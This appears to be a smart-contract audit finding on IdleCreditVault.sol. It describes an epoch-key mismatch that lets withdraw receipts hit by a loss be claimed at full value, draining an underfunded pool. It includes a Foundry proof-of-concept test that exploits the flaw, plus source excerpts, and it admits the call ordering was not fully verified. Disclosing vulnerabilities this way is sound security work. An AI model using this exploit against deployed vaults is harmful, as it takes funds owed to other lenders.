### Title
Loss-adjusted withdraw receipts are haircut under the post-increment epoch key but looked up via `lastWithdrawRequest`, letting defaulted-on receipts claim at par — (`contracts/strategies/idle/IdleCreditVault.sol`)

### Summary
When `stopEpoch` realizes a loss on pending withdraw receipts, `IdleCreditVault.collectWithdrawFunds` stores the recovery price in `lossRecoveryPriceByEpoch[epochNumber]`. However, `epochNumber` is bumped inside `deposit()` during the same stopEpoch flow (when `isEpochRunning()` is still true), while the affected receipts were recorded under the *previous* epoch in `withdrawsRequestsByEpoch[user][epoch]` / `lastWithdrawRequest[user]`. Claim and guard paths look up `lossRecoveryPriceByEpoch[lastWithdrawRequest[user]]`, i.e. the pre-increment key — analogous to reusing a pooled connection under the wrong credentials: the receipt is matched against the wrong epoch bucket and falls through to the full-price funded path.

### Finding Description
- `requestWithdraw` records `lastWithdrawRequest[_user] = currentEpoch` and `withdrawsRequestsByEpoch[_user][currentEpoch]` where `currentEpoch = epochNumber` [1](#0-0) 
- `deposit()` increments `epochNumber` when called while `isEpochRunning()` — which is exactly the stopEpoch funding path [2](#0-1) 
- `collectWithdrawFunds` then writes `lossRecoveryPriceByEpoch[epochNumber]` using the already-incremented counter [3](#0-2) 
- Both the protection guard and the payout path index by `lastWithdrawRequest[_user]` (the old epoch), so `lossRecoveryPrice` reads `0` [4](#0-3) [5](#0-4) 
- `claimWithdrawRequest` therefore skips `_claimLossAdjustedWithdrawRequest` and pays the full `withdrawsRequests[_user]` at par via `_claimFundedWithdrawRequest` [6](#0-5) 

### Impact Explanation
Only `_amount < pendingBasis` (the haircut amount) is pulled from the CDO into the strategy, yet each affected receipt pays out `claimBasis` at par. The first claimer(s) drain the underfunded pool; the deficit equals `claimBasis * (1 - lossRecoveryPrice)` per receipt, and the shortfall is socialized to later claimants / active LPs — direct insolvency and theft of up to the entire pending-receipt bucket in a `stopEpochWithDuration`-style loss epoch. Additionally, the orphan entry in `lossRecoveryPriceByEpoch[N+1]` can mis-haircut an unrelated user who happens to request in epoch N+1.

### Likelihood Explanation
Requires an epoch ending with a loss while normal withdraw receipts are pending — a `stopEpoch` with partial borrower repayment, reachable via honest manager/borrower sequencing with any KYC'd lender holding a pending receipt. No privileged malicious behavior is needed; the attacker is an ordinary withdrawer who claims first. Caveat: the exploit hinges on `collectWithdrawFunds` being invoked after the epoch-bumping `deposit` inside `IdleCDOEpochVariant.stopEpoch` — the grep hits confirm both calls live in that contract but I could not dump the exact ordering within the remaining iterations; if collection precedes the increment, severity drops to the orphan-key mis-haircut case only.

### Recommendation
Key `lossRecoveryPriceByEpoch` by the request epoch of the receipts being haircut (e.g., `epochNumber - 1` after increment, or pass the epoch explicitly), and/or make lookups scan `withdrawsRequestsByEpoch[_user]` epochs rather than relying on a single `lastWithdrawRequest` pointer.

// Foundry fork-style PoC (placed in test/foundry/IdleCreditVault.t.sol harness)
function testLossEpochKeyMismatchPaysAtPar() external {
    _setFeeParams(TL_MULTISIG, 0, FULL_ALLOC, cdoEpoch.managementFee());
    address alice = makeAddr("alice");
    _depositWithUser(alice, 10_000 * ONE_SCALE, true);
    idleCDO.depositAA(10_000 * ONE_SCALE);

    // buffer phase of epoch 0: alice requests withdraw (recorded under epochNumber = 0)
    vm.prank(alice);
    uint256 receipt = cdoEpoch.requestWithdraw(0, address(AAtranche));
    IdleCreditVault vault = IdleCreditVault(address(strategy));
    assertEq(vault.lastWithdrawRequest(alice), 0);
    assertEq(vault.withdrawsRequestsByEpoch(alice, 0), receipt);

    _startEpochAndCheckPrices(0);
    // borrower repays only part: stopEpoch collects less than pendingBasis.
    // deposit() bumps epochNumber to 1 BEFORE collectWithdrawFunds runs.
    uint256 pending = vault.pendingWithdraws();
    uint256 funded = pending / 2; // 50% recovery
    deal(defaultUnderlying, borrower, _expectedFundsEndEpoch() - pending + funded);
    vm.warp(cdoEpoch.epochEndDate() + 1);
    vm.prank(manager);
    cdoEpoch.stopEpoch(initialProvidedApr, 0); // loss path -> collectWithdrawFunds(funded)

    // haircut stored under epoch 1, alice's receipt under epoch 0
    assertGt(vault.lossRecoveryPriceByEpoch(1), 0);
    assertEq(vault.lossRecoveryPriceByEpoch(0), 0);

    _startEpochAndCheckPrices(1);
    // alice claims the FULL receipt at par though only 50% was funded
    uint256 balPre = IERC20Detailed(defaultUnderlying).balanceOf(alice);
    vm.prank(alice);
    cdoEpoch.claimWithdrawRequest();
    assertEq(
        IERC20Detailed(defaultUnderlying).balanceOf(alice) - balPre,
        receipt, // full par payout instead of receipt * lossRecoveryPrice
        "receipt paid at par despite partial funding"
    );
}

  /// @notice Claim a funded non-default withdraw request at par.
  /// @param _user address of the user
  /// @return amount amount claimed
  function _claimFundedWithdrawRequest(address _user) internal returns (uint256 amount) {
    // User should wait at least an epoch before claiming the withdraw. Once the epoch is over user can withdraw 
    // at any time even if a new epoch started. 
    // So if epochNumber is the same as the last withdraw request then we revert. Epoch number is increased at stopEpoch
    // NOTE: If a user does not claim a withdraw request and instead requests another withdraw, he will have to wait
    // for another epoch to claim both requests.
    // NOTE 2: if borrower defaults, old withdraw requests can still be claimed
    if (IIdleCDOEpochVariant(idleCDO).epochEndDate() != 0 && (epochNumber <= lastWithdrawRequest[_user])) {
      revert NotAllowed();
    }
    // settle APR=0 requests once the related epoch has ended
    _settleApr0(_user);
    Apr0UserData storage _apr0User = apr0Users[_user];
    // Claim includes:
    // - settled APR0 principal from finalized epochs
    // - still-open APR0 principal: if pool-close mode was used (_interest == 1), IdleCDO sets
    //   epochEndDate = 0 and claims can be immediate, while _settleApr0 can still skip settlement
    //   for the current request epoch (reqEpoch >= epochNumber).
    // - settled APR0 interest
    uint256 normalAmount = withdrawsRequests[_user];
    uint256 apr0PrincipalAmount = _apr0User.settledPrincipal + _apr0User.principal;
    uint256 apr0InterestAmount = _apr0User.settledInterest;
    amount = normalAmount + apr0PrincipalAmount + apr0InterestAmount;
    // burn strategy tokens 1:1 with the principal only (normal amount already includes interest)
    _burn(_user, normalAmount + apr0PrincipalAmount);
    withdrawsRequests[_user] = 0;
    lastWithdrawRequest[_user] = 0;
    if (apr0PrincipalAmount != 0 || apr0InterestAmount != 0) {
      delete apr0Users[_user];
    }
    _transferFundedClaim(_user, amount);

  function collectWithdrawFunds(uint256 _amount) external {
    _onlyIdleCDO();
    uint256 pendingBasis = pendingWithdraws;
    if (_amount < pendingBasis) {
      // Legacy receipts do not have per-epoch ownership data, so they can only be fully funded.
      if (!defaultRecoveryInitialized) revert NotAllowed();
      uint256 lossRecoveryPrice = _amount * RECOVERY_FULL / pendingBasis;
      // Avoid storing a zero price, which is indistinguishable from "no loss-adjusted epoch".
      if (lossRecoveryPrice == 0) revert NotAllowed();
      pendingWithdraws = 0;
      lossRecoveryPriceByEpoch[epochNumber] = lossRecoveryPrice;
    } else {
      // A plain implementation upgrade may leave legacy normal receipts pending. Their next
      // successful stop can fully fund the aggregate before lazy initialization occurs.
      pendingWithdraws = pendingBasis - _amount;
    }

  function _claimLossAdjustedWithdrawRequest(address _user) internal returns (uint256 amount) {
    uint256 lossEpoch = lastWithdrawRequest[_user];
    uint256 lossRecoveryPrice = lossRecoveryPriceByEpoch[lossEpoch];
    if (lossRecoveryPrice == 0) return amount;

    (uint256 claimBasis, uint256 burnAmount) = _clearWithdrawClaimForEpoch(_user, lossEpoch, false);
    if (claimBasis == 0) return amount;

    // pendingWithdraws was already cleared when the borrower funded the loss-adjusted amount.
    _burn(_user, burnAmount);
    amount = (claimBasis * lossRecoveryPrice) / RECOVERY_FULL;
    _transferFundedClaim(_user, amount);
  }
